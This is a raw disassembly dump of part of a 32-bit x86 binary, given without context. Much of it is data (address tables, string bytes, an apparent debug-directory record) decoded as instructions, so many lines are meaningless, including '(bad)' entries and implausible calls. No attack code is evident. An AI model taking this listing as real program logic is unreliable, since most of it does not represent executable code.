  4333be:	add    DWORD PTR [ebx],esi
  4333c0:	inc    ebp
  4333c1:	add    ecx,DWORD PTR [ebx+0x74943b]
  4333c7:	push   0xffffff8b
  4333c9:	dec    DWORD PTR [ebx-0x7fbaeb54]
  4333cf:	add    eax,DWORD PTR [ecx]
  4333d1:	or     BYTE PTR [eax],al
  4333d3:	call   0xff852bd8
  4333d8:	mov    eax,DWORD PTR [ebp+0x14]
  4333db:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4333e1:	inc    ebp
  4333e2:	dec    ecx
  4333e3:	add    ebp,DWORD PTR [edx+0x14]
  4333e6:	push   0x8b3045
  4333eb:	call   0x33ad8160
  4333f0:	inc    DWORD PTR [ebx]
  4333f2:	mov    DWORD PTR [edi],ecx
  4333f4:	mov    eax,ecx
  4333f6:	or     BYTE PTR [ebp-0x3d],cl
  4333f9:	cmp    eax,edi
  4333fb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  433400:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433406:	adc    al,0xc9
  433408:	inc    ebp
  433409:	adc    BYTE PTR [eax+0x55],dl
  43340c:	jne    0x4333fa
  43340e:	call   0xff54339e
  433413:	dec    ebp
  433414:	inc    ebp
  433415:	mov    ecx,DWORD PTR [ebx+0x390338b]
  43341b:	add    BYTE PTR [ebx],bh
  43341d:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  433421:	push   ebx
  433422:	or     al,0x51
  433424:	dec    ebp
  433425:	xor    DWORD PTR [ebx],0xf32039a
  43342b:	cmp    eax,DWORD PTR [ebp+0x74]
  43342e:	mov    edi,edi
  433430:	pop    edi
  433431:	adc    BYTE PTR [ebx+0x75],bl
  433434:	ret    0x50
  433437:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43343b:	(bad)  
  43343c:	clc    
  43343d:	mov    esp,ebp
  43343f:	pop    ecx
  433440:	mov    ecx,0xf80085c2
  433445:	mov    ecx,DWORD PTR [ecx+edx*2]
  433448:	push   esi
  433449:	push   esi
  43344a:	(bad)  
  43344b:	lock inc DWORD PTR [ebp+0x44]
  43344f:	mov    edx,DWORD PTR [eax]
  433451:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433455:	or     BYTE PTR [ebx+0x7],dl
  433458:	push   ecx
  433459:	ret    
  43345a:	xor    ebx,DWORD PTR [edx+0x37232be]
  433460:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433466:	or     al,0x80
  433468:	jge    0x43346b
  43346a:	mov    DWORD PTR [eax],eax
  43346c:	and    al,0x8
  43346e:	cmp    DWORD PTR [ebp+0x10],eax
  433471:	mov    edx,DWORD PTR [esi]
  433473:	xchg   esp,eax
  433474:	dec    esp
  433475:	add    BYTE PTR [eax],dl
  433477:	mov    ecx,edx
  433479:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43347d:	dec    ebp
  43347e:	into   
  43347f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433485:	mov    edx,DWORD PTR [eax+0x14]
  433488:	das    
  433489:	add    al,0x45
  43348b:	add    BYTE PTR [ebp+0x0],dh
  43348e:	mov    edi,edi
  433490:	and    al,0x50
  433492:	mov    eax,DWORD PTR [eax]
  433494:	and    al,0xd1
  433496:	xor    eax,DWORD PTR [esi]
  433498:	lea    eax,[ebp+0x8]
  43349b:	xor    esi,DWORD PTR [edx+0x3]
  43349e:	add    BYTE PTR [ecx+0x4510fc44],cl
  4334a4:	cmp    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4334aa:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4334b4:	cmp    bh,bh
  4334b6:	pushf  
  4334b7:	mov    edi,edi
  4334b9:	or     BYTE PTR [esi+ecx*1],cl
  4334bc:	jne    0x433481
  4334be:	call   0xc348a
  4334c3:	adc    BYTE PTR [ebp+eax*2+0xc],al
  4334c7:	mov    ebx,DWORD PTR [eax]
  4334c9:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  4334cd:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4334d5:	pop    esi
  4334d6:	jmp    0x4334a1
  4334d8:	and    al,0x10
  4334da:	and    al,0x55
  4334dc:	or     ah,ch
  4334de:	and    al,0xe4
  4334e0:	inc    DWORD PTR [ebx+0x35e81024]
  4334e6:	(bad)  
  4334e7:	pushf  
  4334e8:	dec    DWORD PTR [ecx+0x570c2444]
  4334ee:	pop    esi
  4334ef:	inc    ecx
  4334f0:	in     eax,0x89
  4334f2:	ret    0x24
  4334f5:	mov    edi,eax
  4334f7:	and    al,0x7d
  4334f9:	mov    edx,0x768089c
  4334fe:	clc    
  4334ff:	cli    
  433500:	call   FWORD PTR [edx+0x3893274]
  433506:	dec    DWORD PTR [ecx-0x74e7db01]
  43350c:	adc    al,0xc
  43350e:	(bad)  
  43350f:	jl     0x433535
  433511:	adc    al,0x8b
  433513:	dec    ebp
  433514:	or     al,0x75
  433516:	jmp    0x4334a3
  433518:	adc    BYTE PTR [esp+eax*2],ah
  43351b:	xor    ecx,DWORD PTR [ebx+ecx*4-0x3e]
  43351f:	and    al,0x9a
  433521:	add    ecx,DWORD PTR [ecx+0xeca680f]
  433527:	dec    esp
  433528:	jne    0x433532
  43352a:	jne    0x433565
  43352c:	call   FWORD PTR [ecx*4-0x74ef8bf8]
  433533:	test   BYTE PTR [ebp+0x32],bl
  433536:	and    al,0x85
  433538:	cmp    eax,DWORD PTR [ebp-0x408bdbf8]
  43353e:	pop    edi
  43353f:	(bad)  
  433540:	sbb    edx,DWORD PTR [eax]
  433542:	add    dl,dl
  433544:	cmp    edx,DWORD PTR [eax]
  433546:	add    BYTE PTR [esi+0x7e],al
  433549:	adc    BYTE PTR [eax],al
  43354b:	mov    eax,ds:0x1c00107e
  433550:	push   edx
  433551:	adc    BYTE PTR [eax],al
  433553:	cli    
  433554:	push   ss
  433555:	adc    BYTE PTR [eax],al
  433557:	lahf   
  433558:	adc    edx,DWORD PTR [eax]
  43355a:	add    BYTE PTR [eax+eiz*2+0x10],ah
  43355e:	add    BYTE PTR [edi+0x19001004],ah
  433564:	inc    eax
  433565:	adc    BYTE PTR [eax],al
  433567:	ds jge 0x43357a
  43356a:	add    BYTE PTR [edi],bh
  43356c:	xor    eax,0x35430043
  433571:	inc    ebx
  433572:	add    BYTE PTR [edi+0x35],al
  433575:	inc    ebx
  433576:	add    BYTE PTR [ebx+0x35],cl
  433579:	inc    ebx
  43357a:	add    BYTE PTR [edi+0x35],cl
  43357d:	inc    ebx
  43357e:	add    BYTE PTR [ebx+0x35],dl
  433581:	inc    ebx
  433582:	add    BYTE PTR [edi+0x35],dl
  433585:	inc    ebx
  433586:	add    BYTE PTR [ebx+0x35],bl
  433589:	inc    ebx
  43358a:	add    BYTE PTR [edi+0x35],bl
  43358d:	inc    ebx
  43358e:	add    BYTE PTR [ebx+0x35],ah
  433591:	inc    ebx
  433592:	add    BYTE PTR [edi+0x35],ah
  433595:	inc    ebx
  433596:	add    BYTE PTR [ecx],ah
  433598:	jno    0x4335aa
  43359a:	add    BYTE PTR [esi+ebp*2+0x6dca0010],ah
  4335a1:	adc    BYTE PTR [eax],al
  4335a3:	ja     0x433615
  4335a5:	adc    BYTE PTR [eax],al
  4335a7:	xor    BYTE PTR [edx+0x10],0x0
  4335ab:	loopne 0x43361b
  4335ad:	adc    BYTE PTR [eax],al
  4335af:	cmp    BYTE PTR [eax+0x10],dl
  4335b2:	add    BYTE PTR ds:0x9700104f,al
  4335b8:	xor    eax,0x359b0043
  4335bd:	inc    ebx
  4335be:	add    BYTE PTR [edi-0x5cffbccb],bl
  4335c4:	xor    eax,0x35a70043
  4335c9:	inc    ebx
  4335ca:	add    BYTE PTR [ebx-0x50ffbccb],ch
  4335d0:	xor    eax,0x35b30043
  4335d5:	inc    ebx
  4335d6:	add    BYTE PTR [ecx],al
  4335d8:	add    BYTE PTR [eax],dl
  4335da:	add    al,ah
  4335dc:	pop    ebp
  4335dd:	adc    BYTE PTR [eax],al
  4335df:	add    ah,BYTE PTR ds:0x328d0010
  4335e5:	adc    BYTE PTR [eax],al
  4335e7:	xchg   DWORD PTR [ecx],edx
  4335e9:	adc    BYTE PTR [eax],al
  4335eb:	ja     0x4335f9
  4335ed:	adc    BYTE PTR [eax],al
  4335ef:	add    cl,BYTE PTR [eax]
  4335f1:	adc    BYTE PTR [eax],al
  4335f3:	jle    0x433669
  4335f5:	adc    BYTE PTR [eax],al
  4335f7:	xlat   BYTE PTR ds:[ebx]
  4335f8:	xor    eax,0x35db0043
  4335fd:	inc    ebx
  4335fe:	add    bh,bl
  433600:	xor    eax,0x35e30043
  433605:	inc    ebx
  433606:	add    bh,ah
  433608:	xor    eax,0x35eb0043
  43360d:	inc    ebx
  43360e:	add    bh,ch
  433610:	xor    eax,0x35f30043
  433615:	inc    ebx
  433616:	add    BYTE PTR [esi+0x12],bl
  433619:	adc    BYTE PTR [eax],al
  43361b:	stc    
  43361c:	push   es
  43361d:	adc    BYTE PTR [eax],al
  43361f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  433620:	xor    DWORD PTR [eax],edx
  433622:	add    BYTE PTR [eax+0x7b],dl
  433625:	adc    BYTE PTR [eax],al
  433627:	stos   DWORD PTR es:[edi],eax
  433628:	push   edi
  433629:	adc    BYTE PTR [eax],al
  43362b:	inc    ebp
  43362c:	adc    edx,DWORD PTR [eax]
  43362e:	add    BYTE PTR [eax+0x38],ch
  433631:	adc    BYTE PTR [eax],al
  433633:	pop    ecx
  433634:	and    edx,DWORD PTR [eax]
  433636:	add    BYTE PTR [edi],dl
  433638:	ss inc ebx
  43363a:	add    BYTE PTR [ebx],bl
  43363c:	ss inc ebx
  43363e:	add    BYTE PTR [edi],bl
  433640:	ss inc ebx
  433642:	add    BYTE PTR [ebx],ah
  433644:	ss inc ebx
  433646:	add    BYTE PTR [edi],ah
  433648:	ss inc ebx
  43364a:	add    BYTE PTR [ebx],ch
  43364c:	ss inc ebx
  43364e:	add    BYTE PTR [edi],ch
  433650:	ss inc ebx
  433652:	add    BYTE PTR [ebx],dh
  433654:	ss inc ebx
  433656:	add    BYTE PTR [ecx+0x72],cl
  433659:	adc    BYTE PTR [eax],al
  43365b:	cmp    edi,DWORD PTR [eax+0x10]
  43365e:	add    BYTE PTR [ebx+0x23],dl
  433661:	adc    BYTE PTR [eax],al
  433663:	jno    0x4336d1
  433665:	adc    BYTE PTR [eax],al
  433667:	pop    eax
  433668:	outs   dx,BYTE PTR ds:[esi]
  433669:	adc    BYTE PTR [eax],al
  43366b:	mov    ebx,DWORD PTR [ebx+0x10]
  43366e:	add    BYTE PTR [ebx+ebx*2],ch
  433671:	adc    BYTE PTR [eax],al
  433673:	retf   0x1066
  433676:	add    BYTE PTR [edi+0x36],dl
  433679:	inc    ebx
  43367a:	add    BYTE PTR [ebx+0x36],bl
  43367d:	inc    ebx
  43367e:	add    BYTE PTR [edi+0x36],bl
  433681:	inc    ebx
  433682:	add    BYTE PTR [ebx+0x36],ah
  433685:	inc    ebx
  433686:	add    BYTE PTR [edi+0x36],ah
  433689:	inc    ebx
  43368a:	add    BYTE PTR [ebx+0x36],ch
  43368d:	inc    ebx
  43368e:	add    BYTE PTR [edi+0x36],ch
  433691:	inc    ebx
  433692:	add    BYTE PTR [ebx+0x36],dh
  433695:	inc    ebx
  433696:	add    BYTE PTR [ebx+0x32],al
  433699:	xor    dh,BYTE PTR ds:0x5a52345f
  43369f:	push   esp
  4336a0:	xor    BYTE PTR [esi],dh
  4336a2:	add    BYTE PTR [ecx+0x36],cl
  4336a5:	push   eax
  4336a6:	pop    edi
  4336a7:	ss inc ebx
  4336a9:	ss pop edx
  4336ab:	xor    ebx,DWORD PTR [edi+0x52]
  4336ae:	add    BYTE PTR [edi+ecx*2+0x32],dl
  4336b2:	pop    edi
  4336b3:	dec    esi
  4336b4:	dec    esp
  4336b5:	dec    eax
  4336b6:	xor    esi,DWORD PTR [edx]
  4336b8:	pop    edi
  4336b9:	xor    al,0x4b
  4336bb:	add    BYTE PTR [eax+0x49],cl
  4336be:	push   ebp
  4336bf:	xor    al,0x5f
  4336c1:	dec    esp
  4336c2:	inc    edx
  4336c3:	dec    ecx
  4336c4:	cmp    DWORD PTR [edi+ebx*2],esi
  4336c7:	pop    ecx
  4336c8:	inc    edi
  4336c9:	add    BYTE PTR [eax+0x50],bl
  4336cc:	dec    eax
  4336cd:	pop    edi
  4336ce:	push   ebp
  4336cf:	push   ecx
  4336d0:	inc    edi
  4336d1:	xor    cl,BYTE PTR [edx+0x38]
  4336d4:	push   esi
  4336d5:	add    BYTE PTR [ebx+0x4a],al
  4336d8:	push   edx
  4336d9:	pop    edi
  4336da:	dec    edi
  4336db:	dec    eax
  4336dc:	dec    edi
  4336dd:	dec    edi
  4336de:	dec    edx
  4336df:	add    BYTE PTR [ecx+0x52],al
  4336e2:	cmp    DWORD PTR [edi+0x56],ebx
  4336e5:	aaa    
  4336e6:	dec    esp
  4336e7:	cmp    DWORD PTR [ebx+0x5f],eax
  4336ea:	push   edx
  4336eb:	inc    esp
  4336ec:	add    BYTE PTR [ecx+0x37],bl
  4336ef:	inc    esp
  4336f0:	pop    edi
  4336f1:	dec    ecx
  4336f2:	xor    esi,DWORD PTR [edi]
  4336f4:	xor    DWORD PTR [edi+0x49],ebx
  4336f7:	push   esp
  4336f8:	xor    eax,DWORD PTR [eax]
  4336fa:	push   edx
  4336fb:	xor    BYTE PTR [eax+0x5f],bl
  4336fe:	dec    eax
  4336ff:	push   edi
  433700:	inc    esi
  433701:	xor    DWORD PTR [edi+0x5f],edx
  433704:	cmp    BYTE PTR [ebx+0x37],dl
  433707:	add    BYTE PTR [esi+0x42],dl
  43370a:	dec    ecx
  43370b:	xor    ebx,DWORD PTR [edi+0x45]
  43370e:	xor    BYTE PTR [ebp+0x5f],cl
  433711:	xor    al,0x34
  433713:	xor    BYTE PTR [edx+0x5f],cl
  433716:	inc    edi
  433717:	add    BYTE PTR [edx+0x57],dl
  43371a:	xor    ebx,DWORD PTR [edi+0x31]
  43371d:	dec    edx
  43371e:	push   edi
  43371f:	xor    eax,0x4d435f
  433724:	dec    ecx
  433725:	xor    eax,0x36365f39
  43372a:	dec    eax
  43372b:	xor    BYTE PTR [eax],al
  43372d:	dec    edi
  43372e:	inc    ebx
  43372f:	push   edi
  433730:	pop    edi
  433731:	inc    edi
  433732:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  433737:	add    BYTE PTR [edx+0x58],al
  43373a:	inc    edi
  43373b:	ss pop edi
  43373d:	push   esi
  43373e:	inc    ebx
  43373f:	dec    esi
  433740:	inc    esp
  433741:	add    BYTE PTR [edi+0x4d],cl
  433744:	inc    edi
  433745:	xor    ebx,DWORD PTR [edi+0x34]
  433748:	dec    esi
  433749:	pop    edx
  43374a:	cmp    BYTE PTR [edi+0x58],bl
  43374d:	cmp    BYTE PTR [eax],al
  43374f:	push   edx
  433750:	pop    eax
  433751:	push   ecx
  433752:	pop    edi
  433753:	dec    esp
  433754:	push   edx
  433755:	dec    ecx
  433756:	dec    edi
  433757:	inc    esp
  433758:	pop    edi
  433759:	dec    edi
  43375a:	xor    eax,DWORD PTR [eax+eax*1+0x43]
  43375e:	push   eax
  43375f:	inc    ebp
  433760:	pop    edi
  433761:	xor    eax,0x565f3945
  433766:	add    BYTE PTR [edi+0x4e],al
  433769:	push   esi
  43376a:	pop    edi
  43376b:	inc    edi
  43376c:	push   esp
  43376d:	dec    eax
  43376e:	xor    dh,BYTE PTR [ecx]
  433770:	pop    edi
  433771:	dec    edi
  433772:	xor    eax,DWORD PTR ss:[eax]
  433775:	inc    esp
  433776:	inc    ebp
  433777:	dec    ecx
  433778:	pop    edi
  433779:	push   edx
  43377a:	dec    eax
  43377b:	xor    al,0x48
  43377d:	dec    ecx
  43377e:	ss pop edi
  433780:	aaa    
  433781:	aaa    
  433782:	dec    ecx
  433783:	dec    ebp
  433784:	add    BYTE PTR [eax+0x54],cl
  433787:	ss pop edi
  433789:	inc    esi
  43378a:	inc    edx
  43378b:	xor    dh,BYTE PTR [eax+eax*1]
  43378e:	dec    esi
  43378f:	ss dec edx
  433791:	pop    edi
  433792:	dec    ecx
  433793:	dec    esp
  433794:	inc    edi
  433795:	inc    esp
  433796:	dec    eax
  433797:	xor    BYTE PTR [eax],bh
  433799:	xor    eax,0x4c344f00
  43379e:	xor    esi,DWORD PTR [edi]
  4337a0:	xor    BYTE PTR [edi+0x44],bl
  4337a3:	inc    edi
  4337a4:	dec    ebx
  4337a5:	xor    al,BYTE PTR [ecx+0x43]
  4337a8:	add    BYTE PTR [edi+0x32],cl
  4337ab:	xor    ebx,DWORD PTR [edi+0x57]
  4337ae:	xor    cl,BYTE PTR [edi+0x5f]
  4337b1:	pop    edx
  4337b2:	add    BYTE PTR [eax+0x4c],bl
  4337b5:	cmp    DWORD PTR [edi+0x4b],ebx
  4337b8:	inc    ecx
  4337b9:	dec    edx
  4337ba:	inc    esi
  4337bb:	xor    DWORD PTR [edi+ebx*2],esi
  4337be:	pop    eax
  4337bf:	inc    edi
  4337c0:	inc    edx
  4337c1:	add    BYTE PTR [eax+0x33],dl
  4337c4:	dec    esi
  4337c5:	pop    edi
  4337c6:	dec    eax
  4337c7:	xor    eax,0x485f53
  4337cc:	dec    ebp
  4337cd:	xor    BYTE PTR [edx+0x5f],al
  4337d0:	dec    edx
  4337d1:	pop    eax
  4337d2:	push   esp
  4337d3:	dec    ecx
  4337d4:	dec    esp
  4337d5:	cmp    DWORD PTR [eax+eax*1+0x41],ecx
  4337d9:	xor    esi,DWORD PTR [eax]
  4337db:	pop    edi
  4337dc:	inc    ecx
  4337dd:	pop    edx
  4337de:	push   ecx
  4337df:	pop    edx
  4337e0:	cmp    DWORD PTR [esi],esi
  4337e2:	pop    edi
  4337e3:	dec    eax
  4337e4:	dec    esp
  4337e5:	pop    edx
  4337e6:	add    BYTE PTR [ecx+0x57],dl
  4337e9:	pop    ecx
  4337ea:	pop    edi
  4337eb:	push   esi
  4337ec:	xor    al,0x44
  4337ee:	xor    DWORD PTR [eax],edi
  4337f0:	xor    bl,BYTE PTR [edi+0x39]
  4337f3:	push   esp
  4337f4:	push   esp
  4337f5:	add    BYTE PTR [esi+0x0],dl
  4337f8:	dec    edi
  4337f9:	add    BYTE PTR [edi+0x0],al
  4337fc:	add    BYTE PTR ss:[edi+0x0],bl
  433800:	dec    edi
  433801:	add    BYTE PTR [edx+0x0],bl
  433804:	inc    ebp
  433805:	add    BYTE PTR [eax],dh
  433807:	add    BYTE PTR [ebp+0x0],al
  43380a:	xor    BYTE PTR [eax],al
  43380c:	pop    edi
  43380d:	add    BYTE PTR [eax],dh
  43380f:	add    BYTE PTR ds:0x4f000000,dh
  433815:	add    BYTE PTR ds:0x5f005700,dh
  43381b:	add    BYTE PTR [edi],dh
  43381d:	add    BYTE PTR [ebx+0x0],dl
  433820:	push   ebp
  433821:	add    BYTE PTR [edi+0x0],al
  433824:	xor    al,0x0
  433826:	pop    edi
  433827:	add    BYTE PTR [ecx+0x0],dl
  43382a:	inc    esp
  43382b:	add    BYTE PTR [eax],al
  43382d:	add    BYTE PTR [edx+0x0],dl
  433830:	push   esp
  433831:	add    BYTE PTR ds:0x52005f00,dh
  433837:	add    BYTE PTR [edi+0x0],dl
  43383a:	xor    al,BYTE PTR [eax]
  43383c:	xor    al,BYTE PTR [eax]
  43383e:	xor    BYTE PTR [eax],al
  433840:	xor    BYTE PTR [eax],al
  433842:	pop    edi
  433843:	add    BYTE PTR [esi],dh
  433845:	add    BYTE PTR [eax],al
  433847:	add    BYTE PTR [eax+0x0],cl
  43384a:	inc    ebp
  43384b:	add    BYTE PTR [eax+eax*1+0x30],cl
  43384f:	add    BYTE PTR [edi+0x0],bl
  433852:	dec    edx
  433853:	add    BYTE PTR [edx],dh
  433855:	add    BYTE PTR [edi],dh
  433857:	add    BYTE PTR [ebp+0x0],dl
  43385a:	add    BYTE PTR ss:[eax],dh
  43385d:	add    BYTE PTR [eax],al
  43385f:	add    BYTE PTR [esi+0x0],dl
  433862:	cmp    BYTE PTR [eax],al
  433864:	dec    edi
  433865:	add    BYTE PTR [ecx],bh
  433867:	add    BYTE PTR [edi+0x0],bl
  43386a:	pop    eax
  43386b:	add    BYTE PTR [edx+0x0],bl
  43386e:	dec    esp
  43386f:	add    BYTE PTR [ebx+0x0],cl
  433872:	add    BYTE PTR [eax],al
  433874:	dec    ecx
  433875:	add    BYTE PTR [ebp+0x0],dl
  433878:	dec    edi
  433879:	add    BYTE PTR [eax],bh
  43387b:	add    BYTE PTR [edi+0x0],bl
  43387e:	inc    esp
  43387f:	add    BYTE PTR [eax],bh
  433881:	add    BYTE PTR [ecx+0x0],cl
  433884:	dec    eax
  433885:	add    BYTE PTR [edi+0x0],cl
  433888:	pop    edi
  433889:	add    BYTE PTR [ebp+0x0],al
  43388c:	pop    eax
  43388d:	add    BYTE PTR [eax],al
  43388f:	add    BYTE PTR [edx+0x0],dl
  433892:	dec    esp
  433893:	add    BYTE PTR [esi],dh
  433895:	add    BYTE PTR [edi+0x0],bl
  433898:	aaa    
  433899:	add    BYTE PTR [eax+0x0],bl
  43389c:	xor    eax,DWORD PTR [eax]
  43389e:	inc    edi
  43389f:	add    BYTE PTR [ecx+0x0],dl
  4338a2:	pop    edi
  4338a3:	add    BYTE PTR [edx+0x0],cl
  4338a6:	add    BYTE PTR [eax],al
  4338a8:	inc    edi
  4338a9:	add    BYTE PTR [edi+0x0],cl
  4338ac:	push   ebx
  4338ad:	add    BYTE PTR [eax+eax*1],dh
  4338b0:	pop    edi
  4338b1:	add    BYTE PTR [ecx+0x0],cl
  4338b4:	xor    DWORD PTR [eax],eax
  4338b6:	push   esi
  4338b7:	add    BYTE PTR [ebx],dh
  4338b9:	add    BYTE PTR [edi+0x0],bl
  4338bc:	dec    ecx
  4338bd:	add    BYTE PTR [edx+0x0],bl
  4338c0:	add    BYTE PTR [eax],al
  4338c2:	inc    ebx
  4338c3:	add    BYTE PTR [ecx+0x0],bl
  4338c6:	inc    ecx
  4338c7:	add    BYTE PTR [eax],dh
  4338c9:	add    BYTE PTR [ecx],bh
  4338cb:	add    BYTE PTR [edi+0x0],bl
  4338ce:	cmp    DWORD PTR [eax],eax
  4338d0:	push   eax
  4338d1:	add    BYTE PTR [eax+eax*1],dh
  4338d4:	pop    edx
  4338d5:	add    BYTE PTR [eax],al
  4338d7:	add    BYTE PTR [edx+0x0],al
  4338da:	inc    esi
  4338db:	add    BYTE PTR [eax+eax*1+0x5f],dl
  4338df:	add    BYTE PTR [ebp+0x0],dl
  4338e2:	push   ebp
  4338e3:	add    BYTE PTR [eax+eax*1+0x57],dl
  4338e7:	add    BYTE PTR [eax],al
  4338e9:	add    BYTE PTR [eax+eax*1+0x37],dl
  4338ed:	add    BYTE PTR [eax+eax*1+0x38],dl
  4338f1:	add    BYTE PTR [edi+0x0],bl
  4338f4:	xor    eax,DWORD PTR [eax]
  4338f6:	cmp    DWORD PTR [eax],eax
  4338f8:	dec    eax
  4338f9:	add    BYTE PTR [edi+0x0],bl
  4338fc:	dec    ebp
  4338fd:	add    BYTE PTR [ecx+0x0],bl
  433900:	cmp    DWORD PTR [eax],eax
  433902:	inc    ecx
  433903:	add    BYTE PTR [esi+0x0],cl
  433906:	add    BYTE PTR [eax],al
  433908:	inc    ebx
  433909:	add    BYTE PTR [eax+0x0],dl
  43390c:	dec    esi
  43390d:	add    BYTE PTR [eax+eax*1],dh
  433910:	pop    edi
  433911:	add    BYTE PTR [eax+eax*1+0x54],cl
  433915:	add    BYTE PTR [ebx+0x0],cl
  433918:	xor    DWORD PTR [eax],eax
  43391a:	add    BYTE PTR [eax],al
  43391c:	inc    ecx
  43391d:	add    BYTE PTR [edi],dh
  43391f:	add    BYTE PTR [edx+0x0],cl
  433922:	pop    edi
  433923:	add    BYTE PTR [ebx+0x0],al
  433926:	cmp    BYTE PTR [eax],al
  433928:	push   edi
  433929:	add    BYTE PTR [eax+0x0],dl
  43392c:	pop    edi
  43392d:	add    BYTE PTR [eax+eax*1+0x4e],cl
  433931:	add    BYTE PTR [edx],dh
  433933:	add    BYTE PTR [eax],al
  433935:	add    BYTE PTR [edx+0x0],al
  433938:	add    BYTE PTR [eax],al
  43393a:	push   edx
  43393b:	push   ebx
  43393c:	inc    esp
  43393d:	push   ebx
  43393e:	das    
  43393f:	sbb    bh,BYTE PTR [ecx*8+0x4e2cc44b]
  433946:	lods   al,BYTE PTR ds:[esi]
  433947:	fsub   DWORD PTR es:[esi-0x6470e7d7]
  43394e:	adc    eax,DWORD PTR [eax]
  433950:	add    BYTE PTR [eax],al
  433952:	dec    edi
  433953:	cmp    bl,BYTE PTR [ecx+esi*2+0x54]
  433957:	inc    esp
  433958:	jp     0x4339a8
  43395a:	jb     0x4339b6
  43395c:	addr16 jne 0x4339c2
  43395f:	jns    0x4339d1
  433961:	jbe    0x4339bf
  433963:	push   0x62
  433965:	push   edi
  433966:	jns    0x4339e0
  433968:	inc    ebp
  433969:	ins    DWORD PTR es:[edi],dx
  43396a:	jbe    0x4339d3
  43396c:	popa   
  43396d:	pop    esp
  43396e:	je     0x4339da
  433970:	pop    edx
  433971:	data16 jne 0x4339e6
  433974:	ja     0x4339de
  433976:	push   edx
  433977:	bound  eax,QWORD PTR [ebp+0x72]
  43397a:	pop    esp
  43397b:	dec    edx
  43397c:	jae    0x4339c2
  43397e:	ins    DWORD PTR es:[edi],dx
  43397f:	imul   ebp,DWORD PTR [eax+0x62],0x2e
  433983:	jo     0x4339e9
  433985:	bound  eax,QWORD PTR [eax]
	...
